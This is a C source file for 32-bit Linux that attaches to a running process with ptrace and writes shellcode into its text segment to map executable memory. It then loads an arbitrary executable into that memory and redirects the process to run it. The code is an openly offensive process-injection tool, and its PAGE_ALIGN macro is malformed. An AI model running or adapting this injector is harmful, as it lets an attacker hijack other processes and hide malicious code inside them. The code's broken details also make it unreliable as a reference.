#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/user.h>
#include <elf.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <wait.h>

#define PAGE_ALIGN(x) (x & ~(PAGE_SIZE 1))
#define PAGE_ALIGN_UP(x) (PAGE_ALIGN(x) + PAGE_SIZE)
#define WORD_ALIGN(x) ((x + 7) & ~7)
#define BASE_ADDRESS 0x00100000

typedef struct handle 
{
    Elf32_Ehdr* ehdr;
    Elf32_Phdr* phdr;
    Elf32_Shdr* shdr;
    char* mem;
    pid_t pid;
    char* shellcode;
    char* exec_path;
    uint32_t base;
    uint32_t stack;
    uint32_t entry;
    struct user_regs_struct pt_reg;
} handle_t;

static inline volatile void* evil_map(void *, size_t, int, int, int, off_t) __attribute__((aligned(8), __always_inline__));
uint32_t injection_code(void *) __attribute__((aligned(8)));
uint32_t get_text_base(pid_t);
int pid_write(int, void *, const void *, size_t);
char* create_fn_shellcode(void (*fn)(), size_t len);

void* f1 = injection_code;
void* f2 = get_text_base;

static inline volatile int evil_write(int fd, char* buf, size_t len)
{
    int ret;
    __asm__ volatile(
            "movl $4, %%eax\n"
            "movl %0, %%ebx\n"
            "movl %1, %%ecx\n"
            "movl %2, %%edx\n"
            "int $0x80" : : "g"(fd), "g"(buf), "g"(len));
    asm("movl $0, %%eax \n" : "=r"(ret));
    return ret;
}

static inline volatile int evil_fstat(int fd, struct stat* buf)
{
    int ret;

    __asm__ volatile (
            "movl $108, %%eax\n"
            "movl %0, %%ebx\n"
            "movl %1, %%ecx\n"
            "int $0x80" : : "g"(fd), "g"(buf));
    __asm__ volatile (
            "movl %%eax, %0\n" : "=r"(ret));
    return ret;
}

static inline volatile int evil_open(const char* path, int flags)
{
    int ret;

    __asm__ volatile (
            "movl $5, %%eax\n"
            "movl %0, %%ebx\n"
            "movl %1, %%ecx\n"
            "int $0x80" : : "g"(path), "g"(flags));
    __asm__ volatile (
            "movl %%eax, %0\n" : "=r"(ret));
    return ret;
}

static inline volatile void* evil_mmap(void* addr, size_t len, int prot, int flags, int fd, off_t offset)
{
    int ret;

    int mmap_fd = fd;
    off_t mmap_offset = offset;
    int mmap_flags = flags;

    __asm__ volatile (
            "movl $90, %%eax\n"
            "movl %0, %%ebx\n"
            "movl %1, %%ecx\n"
            "movl %2, %%edx\n"
            "movl %3, %%esi\n"
            "movl %4, %%edi\n"
            "movl %5, %%ebp\n"
            "int $0x80" : : "g"(addr), "g"(len), "g"(prot), "g"(mmap_flags), "g"(mmap_fd), "g"(mmap_offset));
    __asm__ volatile (
            "movl %%eax, %0\n" : "=r"(ret));
    return (void *)ret;
}

/**
 * when compile, value of injection_code() must be smaller than value
 * of get_text_base() because injection_code() has been define first.
 */
uint32_t injection_code(void* vaddr)
{
    volatile void* mem;
    mem = evil_mmap(vaddr, 8192, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    __asm__ __volatile__("int3");
}

#define MAX_PATH 512

/**
 *
 */
uint32_t get_text_base(pid_t pid)
{
    char maps[MAX_PATH], line[256];
    char* start, *p;
    FILE* fd;
    int i;
    Elf32_Addr base;
    snprintf(maps, MAX_PATH, "/proc/%d/maps", pid);
    if ((fd = fopen(maps, "r")) == NULL) {
        fprintf(stderr, "Cannot open %s for reading: %s\n", maps, strerror(errno));
        return 1;
    }
    while (fgets(line, sizeof(line), fd)) {
        if (!strstr(line, "rxp"))
            continue;
        /*
         * The alloca() function allocates size bytes in the stack fram
         * of the caller. This temporary space is automatically freed
         * when the function that called alloca() returns to its caller.
         */
        for (i = 0, start = alloca(32), p = line; *p != ' '; i++, p++)
            start[i] = *p;
        start[i] = '\0';
        base = strtoul(start, NULL, 16);
        break;
    }
    fclose(fd);
    return base;
}

/**
 * create an entry point of the shellcode(pointed by fn).
 */
char* create_fn_shellcode(void (*fn)(), size_t len)
{
    size_t i;
    char* shellcode = (uint8_t *)malloc(len);
    char* p = (char *)fn;
    for (i = 0; i < len; i++)
        *(shellcode + i) = *p++;
    return shellcode;
}

int pid_read(int pid, void* dst, const void* src, size_t len)
{
    int sz = len / sizeof(void *);
    unsigned char* s = (unsigned char *)src;
    unsigned char* d = (unsigned char *)dst;
    int word;

    while (sz > 0) {
        errno = 0;
        word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
        if (word == -1 && errno) {
            fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
            goto fail;
        }
        *(int *)d = word;
        s += sizeof(int);
        d += sizeof(int);
        sz--;
    }
    return 0;
fail:
    perror("PTRACE_PEEKTEXT");
    return 1;
}

int pid_write(int pid, void* dest, const void* src, size_t len)
{
    int quot = len / sizeof(void *);
    unsigned char* s = (unsigned char *)src;
    unsigned char* d = (unsigned char *)dest;
    while (quot > 0) {
        /* 
         * PTRACE_POKETEXT - Copy the word data to the address 
         * addr in the tracee's memory.
         */
        if (ptrace(PTRACE_POKETEXT, pid, d, s) == -1)
            goto failed;
        s += sizeof(void *);
        d += sizeof(void *);
        quot--;
    }
    return 0;
failed:
    perror("PTRACE_POKETEXT");
    return 1;
}

int main(int argc, char* argv[])
{
    handle_t h;
    unsigned int shellcode_size = f2-f1; //
    int i, fd, status;
    char* executable, *origcode;
    struct stat st;
    Elf32_Ehdr* ehdr;

    if (argc < 3) {
        printf("Usage: %s <pid> <executable>\n", argv[0]);
        exit(1);
    }
    h.pid = atoi(argv[1]);
    h.exec_path = strdup(argv[2]);
    if (ptrace(PTRACE_ATTACH, h.pid) < 0) {
        perror("PTRACE_ATTACH");
        exit(1);
    }

    waitpid(h.pid, &status, 0);
    h.base = get_text_base(h.pid);
    /* 
     * shellcode_size is actually the size of injection_code().
     */
    shellcode_size += 4;
    h.shellcode = create_fn_shellcode((void *)&injection_code, shellcode_size);
    origcode = alloca(shellcode_size);
    if (pid_read(h.pid, (void *)origcode, (void *)h.base, shellcode_size) < 0)
        exit(1);
    if (pid_write(h.pid, (void *)h.base, (void *)h.shellcode, shellcode_size) < 0)
        exit(1);
    if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0) {
        perror("PTRACE_GETREGS");
        exit(1);
    }
    h.pt_reg.eip = h.base;
    h.pt_reg.edi = BASE_ADDRESS;
    if (ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0) {
        perror("PTRACE_SETREGS");
        exit(1);
    }
    if (ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0) {
        perror("PTRACE_CONT");
        exit(1);
    }

    wait(&status);
    if (WSTOPSIG(status) != SIGTRAP) {
        printf("Something went wrong\n");
        exit(1);
    }
    if (pid_write(h.pid, (void *)h.base, (void *)origcode, shellcode_size) < 0)
        exit(1);
    if ((fd = open(h.exec_path, O_RDONLY)) < 0) {
        perror("open");
        exit(1);
    }
    if (fstat(fd, &st) < 0) {
        perror("fstat");
        exit(1);
    }
    executable = malloc(WORD_ALIGN(st.st_size));
    if (read(fd, executable, st.st_size) < 0) {
        perror("read");
        exit(1);
    }
    ehdr = (Elf32_Ehdr *)executable;
    h.entry = ehdr->e_entry;
    close(fd);
    if (pid_write(h.pid, (void *)BASE_ADDRESS, (void *)executable, st.st_size) < 0)
        exit(1);
    if (ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0) {
        perror("PTRACE_GETREGS");
        exit(1);
    }
    h.entry = BASE_ADDRESS + h.entry;
    h.pt_reg.eip = h.entry;
    if (ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0) {
        perror("PTRACE_SETREGS");
        exit(1);
    }
    if (ptrace(PTRACE_DETACH, h.pid, NULL, NULL) < 0) {
        perror("PTRACE_DETACH");
        exit(1);
    }
    wait(NULL);
    exit(0);
}
